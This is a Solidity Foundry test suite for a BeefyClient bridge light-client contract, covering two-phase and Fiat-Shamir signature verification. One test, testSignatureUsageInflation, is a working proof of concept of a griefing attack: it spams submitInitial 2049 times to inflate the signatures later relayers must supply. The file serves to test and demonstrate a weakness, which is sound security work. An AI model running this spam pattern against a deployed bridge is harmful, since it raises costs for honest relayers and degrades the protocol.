pragma solidity 0.8.28;

import "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {BeefyClient} from "../src/BeefyClient.sol";
import {BeefyClientMock} from "./mocks/BeefyClientMock.sol";
import {Bitfield} from "../src/utils/Bitfield.sol";
import {ScaleCodec} from "../src/utils/ScaleCodec.sol";
import {SubstrateMerkleProof} from "../src/utils/SubstrateMerkleProof.sol";
import {Math} from "../src/utils/Math.sol";
import {MerkleLib, MerkleLibSubstrate} from "./utils/MerkleLib.sol";

contract BeefyClientAdvancedTest is Test {
    using stdJson for string;

    BeefyClientMock beefyClient;
    uint256 constant VSET_LEN = 600;
    uint64 constant VSET_ID = 1;
    uint256 constant RANDAO_DELAY = 128;
    uint256 constant RANDAO_EXPIRY = 24;
    uint256 constant MIN_REQ_SIGS = 17; // keep N small to show N < quorum
    uint256 constant FIAT_SHAMIR_REQUIRED_SIGNATURES = 101;

    uint256[VSET_LEN] privkeys;
    address[VSET_LEN] validators;
    bytes32 vsetRoot;
    bytes32[] vLeaves;
    bytes32[][] vProofs;
    address validator0;
    uint256 validator0PK;
    bytes32[] proofIndex0;

    bytes2 constant MMR_ROOT_ID = bytes2("mh");
    bytes32 constant MMRRoot =
        bytes32(uint256(0xDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF));

    address honestRelayer1 = address(0xBEEF);
    address honestRelayer2 = address(0xCAFE);
    address attacker = address(0xA11CE);

    function setUp() public {
        vLeaves = new bytes32[](VSET_LEN);
        for (uint256 i = 0; i < VSET_LEN; i++) {
            privkeys[i] = uint256(keccak256(abi.encodePacked("v", i)));
            validators[i] = vm.addr(privkeys[i]);
            vLeaves[i] = keccak256(abi.encodePacked(validators[i]));
            if (i == 0) {
                validator0 = validators[i];
                validator0PK = privkeys[i];
            }
        }

        // substrate-compatible merkle root & per-leaf proofs
        (vsetRoot, vProofs) = MerkleLibSubstrate.buildBinaryMerkleTree(vLeaves);
        proofIndex0 = vProofs[0];

        BeefyClient.ValidatorSet memory cur =
            BeefyClient.ValidatorSet({id: VSET_ID, length: uint128(VSET_LEN), root: vsetRoot});
        BeefyClient.ValidatorSet memory nxt =
            BeefyClient.ValidatorSet({id: VSET_ID + 1, length: uint128(VSET_LEN), root: vsetRoot});

        beefyClient = new BeefyClientMock({
            _randaoCommitDelay: RANDAO_DELAY,
            _randaoCommitExpiration: RANDAO_EXPIRY,
            _minNumRequiredSignatures: MIN_REQ_SIGS,
            _fiatShamirRequiredSignatures: FIAT_SHAMIR_REQUIRED_SIGNATURES,
            _initialBeefyBlock: 0,
            _initialValidatorSet: cur,
            _nextValidatorSet: nxt
        });
    }

    function testSignatureUsageInflation() external {
        (BeefyClient.Commitment memory commitment, bytes32 commitmentHash) =
            _buildCommitment(1, VSET_ID, MMRRoot);

        uint256 quorum = beefyClient.computeQuorum_public(VSET_LEN);
        uint256[] memory bitfield = new uint256[](Bitfield.containerLength(VSET_LEN));
        for (uint256 i = 0; i < quorum; i++) {
            Bitfield.set(bitfield, i); // claim 0..quorum-1 signed
        }
        // === real validator proof for index 0 with a real signature ===
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validator0PK, commitmentHash);
        BeefyClient.ValidatorProof memory vproof = BeefyClient.ValidatorProof({
            v: v, r: r, s: s, index: 0, account: validator0, proof: proofIndex0
        });

        vm.startPrank(honestRelayer1);
        beefyClient.submitInitial(commitment, bitfield, vproof);
        bytes32 ticketID1 = beefyClient.createTicketID_public(honestRelayer1, commitmentHash);
        (
            ,, /*blockNumber1*/ /*vsetLen1*/
            uint32 nRequiredBefore,, /*prevRandao1*/ /*bitfieldHash1*/
        ) = beefyClient.tickets(ticketID1);
        vm.stopPrank();

        vm.startPrank(attacker);
        uint256 spam = 2049; // ceilLog2(2049) = 12  => ΔN = 2*12 = +24
        for (uint256 i = 0; i < spam; i++) {
            beefyClient.submitInitial(commitment, bitfield, vproof);
        }
        vm.stopPrank();
        // -------------------------
        // impact: new relayer now gets 24+ extra sigs required
        // -------------------------
        vm.startPrank(honestRelayer2);
        beefyClient.submitInitial(commitment, bitfield, vproof);
        bytes32 ticketID2 = beefyClient.createTicketID_public(honestRelayer2, commitmentHash);
        (,, /*blockNumber2*/ /*vsetLen2*/ uint32 nRequiredAfter,/*prevRandao2*/ /*bfhash2*/,) =
            beefyClient.tickets(ticketID2);
        vm.stopPrank();
        // assert protocol-wide grief: ΔN >= 24 and never exceeds quorum
        assertGt(nRequiredAfter, nRequiredBefore, "N did not increase");
        assertLe(nRequiredAfter, uint32(quorum), "N must be capped at quorum");
        assertTrue(
            nRequiredAfter >= nRequiredBefore + 24, unicode"Need ΔN >= 24 for high-impact demo"
        );
        // logs
        emit log_named_uint("Baseline N (before attack)", nRequiredBefore);
        emit log_named_uint("N after attack", nRequiredAfter);
        emit log_named_uint(unicode"ΔN", nRequiredAfter - nRequiredBefore);
        emit log_named_uint("Quorum cap", quorum);
    }

    function testTwoPhaseCommitWithRequiredSignatures() public {
        console.log("Submit initial commitment");
        (BeefyClient.Commitment memory commitment, bytes32 commitmentHash) =
            _buildCommitment(1, VSET_ID, MMRRoot);

        uint256 quorum = beefyClient.computeQuorum_public(VSET_LEN);
        uint256[] memory bitfield = new uint256[](Bitfield.containerLength(VSET_LEN));
        for (uint256 i = 0; i < quorum; i++) {
            Bitfield.set(bitfield, i); // claim 0..quorum-1 signed
        }
        // === real validator proof for index 0 with a real signature ===
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validator0PK, commitmentHash);
        BeefyClient.ValidatorProof memory vproof = BeefyClient.ValidatorProof({
            v: v, r: r, s: s, index: 0, account: validator0, proof: proofIndex0
        });

        vm.startPrank(honestRelayer1);
        beefyClient.submitInitial(commitment, bitfield, vproof);

        console.log("commit PREVRANDAO after the required delay");
        vm.roll(block.number + RANDAO_DELAY);
        // set a deterministic PREVRANDAO
        bytes32 PREVRANDAO = bytes32(
            uint256(
                2_954_466_101_346_023_252_933_346_884_990_731_083_400_112_195_551_952_331_583_346_342_070_284_928_184
            )
        );
        vm.prevrandao(PREVRANDAO);
        beefyClient.commitPrevRandao(commitmentHash);

        // MMR leaf/proof params are ignored when validatorSetID == current set; we pass dummies
        BeefyClient.MMRLeaf memory dummyLeaf2;

        console.log("submit final proof with insufficient signatures");
        BeefyClient.ValidatorProof[] memory finalProofs =
            _generateFinalProofs(commitmentHash, bitfield, MIN_REQ_SIGS - 1);
        vm.expectRevert(BeefyClient.InvalidValidatorProofLength.selector);
        beefyClient.submitFinal(commitment, bitfield, finalProofs, dummyLeaf2, new bytes32[](0), 0);

        console.log("submit final proof with wrong signatures");
        finalProofs = _generateFinalProofs(commitmentHash, bitfield, MIN_REQ_SIGS);
        finalProofs[0].account = address(0x1234); // invalidate one proof
        vm.expectRevert(BeefyClient.InvalidValidatorProof.selector);
        beefyClient.submitFinal(commitment, bitfield, finalProofs, dummyLeaf2, new bytes32[](0), 0);

        console.log("submit final proof with sufficient signatures");
        finalProofs = _generateFinalProofs(commitmentHash, bitfield, MIN_REQ_SIGS);
        beefyClient.submitFinal(commitment, bitfield, finalProofs, dummyLeaf2, new bytes32[](0), 0);
        assertEq(beefyClient.latestMMRRoot(), MMRRoot, "MMR root updated");
    }

    function testFiatShamirCommitWithRequiredSignatures() public {
        (BeefyClient.Commitment memory commitment, bytes32 commitmentHash) =
            _buildCommitment(1, VSET_ID, MMRRoot);

        uint256 quorum = beefyClient.computeQuorum_public(VSET_LEN);
        uint256[] memory bitfield = new uint256[](Bitfield.containerLength(VSET_LEN));
        for (uint256 i = 0; i < quorum; i++) {
            Bitfield.set(bitfield, i); // claim 0..quorum-1 signed
        }

        // MMR leaf/proof params are ignored when validatorSetID == current set; we pass dummies
        BeefyClient.MMRLeaf memory dummyLeaf2;

        console.log("submit final proof with sufficient signatures");
        BeefyClient.ValidatorProof[] memory finalProofs = _generateFiatShamirProofs(
            commitment, commitmentHash, bitfield, FIAT_SHAMIR_REQUIRED_SIGNATURES
        );
        beefyClient.submitFiatShamir(
            commitment, bitfield, finalProofs, dummyLeaf2, new bytes32[](0), 0
        );
        assertEq(beefyClient.latestMMRRoot(), MMRRoot, "MMR root updated");
    }

    function testFiatShamirCommitRevertsOnInsufficientSignatures() public {
        (BeefyClient.Commitment memory commitment, bytes32 commitmentHash) =
            _buildCommitment(1, VSET_ID, MMRRoot);

        uint256 quorum = beefyClient.computeQuorum_public(VSET_LEN);
        uint256[] memory bitfield = new uint256[](Bitfield.containerLength(VSET_LEN));
        for (uint256 i = 0; i < quorum; i++) {
            Bitfield.set(bitfield, i);
        }

        BeefyClient.MMRLeaf memory dummyLeaf2;

        console.log("submit proof with insufficient signatures");
        // Insufficient signatures
        uint256 insufficientSignatures = FIAT_SHAMIR_REQUIRED_SIGNATURES - 1;
        BeefyClient.ValidatorProof[] memory finalProofs = _generateFiatShamirProofs(
            commitment, commitmentHash, bitfield, insufficientSignatures
        );
        vm.expectRevert(BeefyClient.InvalidValidatorProofLength.selector);
        beefyClient.submitFiatShamir(
            commitment, bitfield, finalProofs, dummyLeaf2, new bytes32[](0), 0
        );
    }

    function testFiatShamirCommitRevertsOnInvalidProof() public {
        (BeefyClient.Commitment memory commitment, bytes32 commitmentHash) =
            _buildCommitment(1, VSET_ID, MMRRoot);

        // Insufficient quorum
        uint256 quorum = beefyClient.computeQuorum_public(VSET_LEN);
        uint256[] memory bitfield = new uint256[](Bitfield.containerLength(VSET_LEN));
        for (uint256 i = 0; i < quorum; i++) {
            Bitfield.set(bitfield, i);
        }

        BeefyClient.MMRLeaf memory dummyLeaf2;

        console.log("submit proof with wrong signatures");
        BeefyClient.ValidatorProof[] memory finalProofs = _generateFiatShamirProofs(
            commitment, commitmentHash, bitfield, FIAT_SHAMIR_REQUIRED_SIGNATURES
        );
        // invalidate one proof
        finalProofs[0].account = address(0x1234);
        vm.expectRevert(BeefyClient.InvalidValidatorProof.selector);
        beefyClient.submitFiatShamir(
            commitment, bitfield, finalProofs, dummyLeaf2, new bytes32[](0), 0
        );
    }

    function testFiatShamirCommitRevertsWithInsufficientInitialBitfieldQuorum() public {
        (BeefyClient.Commitment memory commitment, bytes32 commitmentHash) =
            _buildCommitment(1, VSET_ID, MMRRoot);

        uint256 quorum = beefyClient.computeQuorum_public(VSET_LEN);
        // Should revert when creating final bitfield with insufficient quorum
        uint256 quorum2 = quorum - 1;
        uint256[] memory bitfield = new uint256[](Bitfield.containerLength(VSET_LEN));
        for (uint256 i = 0; i < quorum2; i++) {
            Bitfield.set(bitfield, i);
        }
        vm.expectRevert(BeefyClient.InvalidBitfield.selector);
        beefyClient.createFiatShamirFinalBitfield(commitment, bitfield);

        // Generate final proof with sufficient quorum
        bitfield = new uint256[](Bitfield.containerLength(VSET_LEN));
        for (uint256 i = 0; i < quorum; i++) {
            Bitfield.set(bitfield, i);
        }
        BeefyClient.MMRLeaf memory dummyLeaf2;
        console.log("submit final proof with sufficient signatures");
        BeefyClient.ValidatorProof[] memory finalProofs = _generateFiatShamirProofs(
            commitment, commitmentHash, bitfield, FIAT_SHAMIR_REQUIRED_SIGNATURES
        );

        // Should revert when submitting with insufficient quorum
        uint256[] memory bitfield2 = new uint256[](Bitfield.containerLength(VSET_LEN));
        for (uint256 i = 0; i < quorum2; i++) {
            Bitfield.set(bitfield2, i);
        }
        vm.expectRevert(BeefyClient.InvalidBitfield.selector);
        beefyClient.submitFiatShamir(
            commitment, bitfield2, finalProofs, dummyLeaf2, new bytes32[](0), 0
        );
    }

    function testFiatShamirCommitWithNextValidatorSet() public {
        // Construct a MMRLeaf that advances the validator set: nextAuthoritySetID = nextValidatorSet.id + 1
        BeefyClient.MMRLeaf memory leaf;
        leaf.version = 0;
        leaf.parentNumber = 0;
        leaf.parentHash = bytes32(0);
        // nextValidatorSet.id == VSET_ID + 1, so set leaf.nextAuthoritySetID = VSET_ID + 2
        leaf.nextAuthoritySetID = VSET_ID + 2;
        leaf.nextAuthoritySetLen = uint32(VSET_LEN);
        leaf.nextAuthoritySetRoot = keccak256(abi.encodePacked("next-authority-root"));
        leaf.parachainHeadsRoot = bytes32(0);

        // Compute the MMR leaf hash for this leaf and build a Merkle fixture
        bytes memory encodedLeaf = bytes.concat(
            ScaleCodec.encodeU8(leaf.version),
            ScaleCodec.encodeU32(leaf.parentNumber),
            leaf.parentHash,
            ScaleCodec.encodeU64(leaf.nextAuthoritySetID),
            ScaleCodec.encodeU32(leaf.nextAuthoritySetLen),
            leaf.nextAuthoritySetRoot,
            leaf.parachainHeadsRoot
        );
        bytes32 leafHash = keccak256(encodedLeaf);

        // Build a small Merkle tree (power-of-two leaves) where one leaf equals our leafHash
        // and extract a non-empty proof for that leaf using the shared MerkleLib.
        (bytes32 mmrRoot, bytes32[] memory leafProof, uint256 leafProofOrder) =
            MerkleLib.buildMerkleWithTargetLeaf(16, 3, leafHash);

        // Now build a commitment that contains the Merkle root and generate proofs
        (BeefyClient.Commitment memory commitment, bytes32 commitmentHash) =
            _buildCommitment(1, VSET_ID + 1, mmrRoot);

        uint256 quorum = beefyClient.computeQuorum_public(VSET_LEN);
        uint256[] memory bitfield = new uint256[](Bitfield.containerLength(VSET_LEN));
        for (uint256 i = 0; i < quorum; i++) {
            Bitfield.set(bitfield, i);
        }

        // Generate Fiat-Shamir proofs (will sample from nextValidatorSet)
        BeefyClient.ValidatorProof[] memory finalProofs = _generateFiatShamirProofs(
            commitment, commitmentHash, bitfield, FIAT_SHAMIR_REQUIRED_SIGNATURES
        );

        // Submit using Fiat-Shamir path with a real non-empty leaf proof
        beefyClient.submitFiatShamir(
            commitment, bitfield, finalProofs, leaf, leafProof, leafProofOrder
        );
        assertEq(beefyClient.latestMMRRoot(), mmrRoot, "MMR root updated");
        assertEq(beefyClient.latestBeefyBlock(), uint64(1), "beefy block updated");
    }

    // ---------------------- Helpers ----------------------

    function _buildCommitment(uint32 blockNumber, uint64 validatorSetID, bytes32 mmrRoot)
        internal
        view
        returns (BeefyClient.Commitment memory commitment, bytes32 commitmentHash)
    {
        BeefyClient.PayloadItem[] memory payload = new BeefyClient.PayloadItem[](1);
        payload[0] = BeefyClient.PayloadItem({payloadID: MMR_ROOT_ID, data: bytes.concat(mmrRoot)});
        commitment = BeefyClient.Commitment({
            blockNumber: blockNumber, validatorSetID: validatorSetID, payload: payload
        });
        commitmentHash = keccak256(beefyClient.encodeCommitment_public(commitment));
    }

    function _generateFinalProofs(
        bytes32 commitmentHash,
        uint256[] memory bitfield,
        uint256 minimRequireSigs
    ) internal view returns (BeefyClient.ValidatorProof[] memory) {
        uint256 quorum = beefyClient.computeQuorum_public(VSET_LEN);
        uint256 quorum2 =
            beefyClient.computeNumRequiredSignatures_public(VSET_LEN, 0, minimRequireSigs);
        uint256[] memory finalBitfield = beefyClient.createFinalBitfield(commitmentHash, bitfield);
        BeefyClient.ValidatorProof[] memory finalProofs = new BeefyClient.ValidatorProof[](quorum2);
        uint256 j = 0;
        for (uint256 i = 0; i < quorum; i++) {
            if (Bitfield.isSet(finalBitfield, i)) {
                (uint8 v, bytes32 r, bytes32 s) = vm.sign(privkeys[i], commitmentHash);
                finalProofs[j] = BeefyClient.ValidatorProof({
                    v: v,
                    r: r,
                    s: s,
                    index: i,
                    account: validators[i],
                    proof: vProofs[i] // merkle path to vsetRoot
                });
                j++;
                if (j == quorum2) {
                    break;
                }
            }
        }
        return finalProofs;
    }

    function _generateFiatShamirProofs(
        BeefyClient.Commitment memory commitment,
        bytes32 commitmentHash,
        uint256[] memory bitfield,
        uint256 minimRequireSigs
    ) internal view returns (BeefyClient.ValidatorProof[] memory) {
        uint256 quorum = beefyClient.computeQuorum_public(VSET_LEN);

        uint256 quorum2 = Math.min(minimRequireSigs, quorum);

        uint256[] memory finalBitfield =
            beefyClient.createFiatShamirFinalBitfield(commitment, bitfield);
        BeefyClient.ValidatorProof[] memory finalProofs = new BeefyClient.ValidatorProof[](quorum2);
        uint256 j = 0;
        for (uint256 i = 0; i < quorum; i++) {
            if (Bitfield.isSet(finalBitfield, i)) {
                (uint8 v, bytes32 r, bytes32 s) = vm.sign(privkeys[i], commitmentHash);
                finalProofs[j] = BeefyClient.ValidatorProof({
                    v: v,
                    r: r,
                    s: s,
                    index: i,
                    account: validators[i],
                    proof: vProofs[i] // merkle path to vsetRoot
                });
                j++;
                if (j == quorum2) {
                    break;
                }
            }
        }
        return finalProofs;
    }
}
